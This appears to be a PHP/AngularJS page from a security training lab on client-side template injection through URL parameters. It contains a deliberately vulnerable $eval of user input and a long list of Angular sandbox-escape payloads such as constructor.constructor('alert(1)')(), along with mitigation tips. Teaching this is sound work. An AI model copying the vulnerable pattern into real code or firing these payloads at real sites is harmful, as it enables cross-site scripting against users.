<?php
// Lab 3: CSTI via URL Parameters
// Vulnerability: CSTI through URL parameters and fragments

session_start();

$message = '';
$user_input = '';
$template_output = '';

// Simulate CSTI via URL parameters
function process_csti_url_input($input) {
    // Vulnerable: Direct template processing without validation
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct template processing without encoding
    return $input;
}

// Handle CSTI from URL parameters
if (isset($_GET['template'])) {
    $user_input = $_GET['template'];
    $template_output = process_csti_url_input($user_input);
    $message = '<div class="alert alert-success">Template processed from URL parameter!</div>';
}

// Handle CSTI from URL fragment
if (isset($_GET['fragment'])) {
    $user_input = $_GET['fragment'];
    $template_output = process_csti_url_input($user_input);
    $message = '<div class="alert alert-success">Template processed from URL fragment!</div>';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 3: CSTI via URL Parameters - Client-side Template Injection Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    <script src="https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.min.js"></script>
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .template-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .url-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body ng-app="cstiApp" ng-controller="cstiController">
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CSTI Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 3: CSTI via URL Parameters</h1>
            <p class="hero-subtitle">CSTI through URL parameters and fragments</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates CSTI vulnerabilities that occur through URL parameters and fragments. Attackers can inject malicious template expressions via URL parameters, which are then processed by the client-side template engine.</p>
            <p><strong>Objective:</strong> Inject malicious template expressions via URL parameters to achieve XSS.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct template processing from URL
function process_csti_url_input($input) {
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct template processing without encoding
    return $input;
}

// URL parameters
?template={{ 7*7 }}
?fragment={{ $eval('alert(1)') }}

// Angular template (vulnerable)
&lt;div ng-bind-html="userInput"&gt;&lt;/div&gt;
&lt;div&gt;{{ userInput }}&lt;/div&gt;</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-link me-2"></i>URL Parameter CSTI Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="url-info">
                            <h5>URL Parameters</h5>
                            <p>Try these URL parameters:</p>
                            <ul>
                                <li><code>?template={{ 7*7 }}</code> - Math expression</li>
                                <li><code>?template={{ 'Hello' + 'World' }}</code> - String concatenation</li>
                                <li><code>?template={{ $eval('alert(1)') }}</code> - Code execution</li>
                                <li><code>?fragment={{ constructor.constructor('alert(1)')() }}</code> - Constructor injection</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Current URL Parameters</h5>
                            <p><strong>Template:</strong> <?php echo htmlspecialchars($_GET['template'] ?? 'None'); ?></p>
                            <p><strong>Fragment:</strong> <?php echo htmlspecialchars($_GET['fragment'] ?? 'None'); ?></p>
                        </div>
                        
                        <div class="mt-3">
                            <a href="?template={{ 7*7 }}" class="btn btn-primary me-2">Test Math Expression</a>
                            <a href="?template={{ 'Hello' + 'World' }}" class="btn btn-primary me-2">Test String Concatenation</a>
                            <a href="?template={{ $eval('alert(1)') }}" class="btn btn-primary me-2">Test Code Execution</a>
                            <a href="?fragment={{ constructor.constructor('alert(1)')() }}" class="btn btn-primary">Test Constructor Injection</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Template Output
                    </div>
                    <div class="card-body">
                        <div class="template-display">
                            <h5>Angular Template Output</h5>
                            <div ng-bind-html="userInput"></div>
                            <div>{{ userInput }}</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> CSTI via URL Parameters</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> GET</li>
                        <li><strong>Issue:</strong> Direct template processing from URL</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>URL Parameter Types</h5>
                    <ul>
                        <li><strong>Query Parameters:</strong> ?template=value</li>
                        <li><strong>URL Fragments:</strong> #fragment=value</li>
                        <li><strong>Hash Parameters:</strong> #!template=value</li>
                        <li><strong>Multiple Parameters:</strong> ?a=1&b=2</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>CSTI URL Parameter Payloads</h5>
            <p>Use these URL parameters to test Client-side Template Injection vulnerabilities:</p>
            
            <h6>1. Basic Math Expressions:</h6>
            <div class="code-block">?template={{ 7*7 }}
?template={{ 1+1 }}
?template={{ 10-5 }}
?template={{ 2*3 }}
?template={{ 8/2 }}</div>

            <h6>2. String Concatenation:</h6>
            <div class="code-block">?template={{ 'Hello' + 'World' }}
?template={{ 'a' + 'b' + 'c' }}
?template={{ 'XSS' + 'Test' }}
?template={{ 'CSTI' + 'Vulnerability' }}</div>

            <h6>3. Variable Access:</h6>
            <div class="code-block">?template={{ $root }}
?template={{ $parent }}
?template={{ $scope }}
?template={{ this }}
?template={{ self }}</div>

            <h6>4. Function Calls:</h6>
            <div class="code-block">?template={{ $eval('alert(1)') }}
?template={{ $eval('console.log(1)') }}
?template={{ $eval('document.write(1)') }}
?template={{ $eval('window.alert(1)') }}</div>

            <h6>5. Constructor Injection:</h6>
            <div class="code-block">?template={{ constructor.constructor('alert(1)')() }}
?template={{ constructor.constructor('console.log(1)')() }}
?template={{ constructor.constructor('document.write(1)')() }}
?template={{ constructor.constructor('window.alert(1)')() }}</div>

            <h6>6. Object Property Access:</h6>
            <div class="code-block">?template={{ $root.constructor }}
?template={{ $parent.constructor }}
?template={{ $scope.constructor }}
?template={{ this.constructor }}</div>

            <h6>7. Array Access:</h6>
            <div class="code-block">?template={{ [].constructor }}
?template={{ [].constructor.constructor }}
?template={{ [].constructor.constructor('alert(1)')() }}
?template={{ [].constructor.constructor('console.log(1)')() }}</div>

            <h6>8. String Methods:</h6>
            <div class="code-block">?template={{ 'a'.constructor }}
?template={{ 'a'.constructor.constructor }}
?template={{ 'a'.constructor.constructor('alert(1)')() }}
?template={{ 'a'.constructor.constructor('console.log(1)')() }}</div>

            <h6>9. Number Methods:</h6>
            <div class="code-block">?template={{ 1.constructor }}
?template={{ 1.constructor.constructor }}
?template={{ 1.constructor.constructor('alert(1)')() }}
?template={{ 1.constructor.constructor('console.log(1)')() }}</div>

            <h6>10. Boolean Methods:</h6>
            <div class="code-block">?template={{ true.constructor }}
?template={{ true.constructor.constructor }}
?template={{ true.constructor.constructor('alert(1)')() }}
?template={{ true.constructor.constructor('console.log(1)')() }}</div>

            <h6>11. Function Methods:</h6>
            <div class="code-block">?template={{ (function(){}).constructor }}
?template={{ (function(){}).constructor.constructor }}
?template={{ (function(){}).constructor.constructor('alert(1)')() }}
?template={{ (function(){}).constructor.constructor('console.log(1)')() }}</div>

            <h6>12. Object Methods:</h6>
            <div class="code-block">?template={{ {}.constructor }}
?template={{ {}.constructor.constructor }}
?template={{ {}.constructor.constructor('alert(1)')() }}
?template={{ {}.constructor.constructor('console.log(1)')() }}</div>

            <h6>13. Date Methods:</h6>
            <div class="code-block">?template={{ Date.constructor }}
?template={{ Date.constructor.constructor }}
?template={{ Date.constructor.constructor('alert(1)')() }}
?template={{ Date.constructor.constructor('console.log(1)')() }}</div>

            <h6>14. Math Methods:</h6>
            <div class="code-block">?template={{ Math.constructor }}
?template={{ Math.constructor.constructor }}
?template={{ Math.constructor.constructor('alert(1)')() }}
?template={{ Math.constructor.constructor('console.log(1)')() }}</div>

            <h6>15. JSON Methods:</h6>
            <div class="code-block">?template={{ JSON.constructor }}
?template={{ JSON.constructor.constructor }}
?template={{ JSON.constructor.constructor('alert(1)')() }}
?template={{ JSON.constructor.constructor('console.log(1)')() }}</div>

            <h6>16. RegExp Methods:</h6>
            <div class="code-block">?template={{ RegExp.constructor }}
?template={{ RegExp.constructor.constructor }}
?template={{ RegExp.constructor.constructor('alert(1)')() }}
?template={{ RegExp.constructor.constructor('console.log(1)')() }}</div>

            <h6>17. Error Methods:</h6>
            <div class="code-block">?template={{ Error.constructor }}
?template={{ Error.constructor.constructor }}
?template={{ Error.constructor.constructor('alert(1)')() }}
?template={{ Error.constructor.constructor('console.log(1)')() }}</div>

            <h6>18. Promise Methods:</h6>
            <div class="code-block">?template={{ Promise.constructor }}
?template={{ Promise.constructor.constructor }}
?template={{ Promise.constructor.constructor('alert(1)')() }}
?template={{ Promise.constructor.constructor('console.log(1)')() }}</div>

            <h6>19. URL Fragment Parameters:</h6>
            <div class="code-block">#fragment={{ 7*7 }}
#fragment={{ 'Hello' + 'World' }}
#fragment={{ $eval('alert(1)') }}
#fragment={{ constructor.constructor('alert(1)')() }}</div>

            <h6>20. Advanced URL Parameters:</h6>
            <div class="code-block">?template={{ $eval('$eval("alert(1)")') }}
?template={{ $eval('constructor.constructor("alert(1)")()') }}
?template={{ $eval('$root.constructor.constructor("alert(1)")()') }}
?template={{ $eval('$parent.constructor.constructor("alert(1)")()') }}</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Cross-Site Scripting (XSS) via URL parameters</li>
                <li>Data theft and sensitive information disclosure</li>
                <li>Session hijacking and account takeover</li>
                <li>Malicious redirects and phishing attacks</li>
                <li>Keylogging and form hijacking</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use Content Security Policy (CSP) to prevent code execution</li>
                    <li>Implement proper output encoding</li>
                    <li>Use whitelist-based filtering for allowed template expressions</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual template processing patterns</li>
                    <li>Use Angular's built-in sanitization features</li>
                    <li>Implement proper template sandboxing</li>
                    <li>Validate and sanitize URL parameters</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        var app = angular.module('cstiApp', []);
        app.controller('cstiController', function($scope, $sce) {
            $scope.userInput = '<?php echo addslashes($template_output); ?>';
            
            // Vulnerable: Direct template processing without sanitization
            $scope.$watch('userInput', function(newValue) {
                if (newValue) {
                    // Vulnerable: Direct evaluation without validation
                    try {
                        $scope.processedValue = $scope.$eval(newValue);
                    } catch (e) {
                        $scope.processedValue = 'Error: ' + e.message;
                    }
                }
            });
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
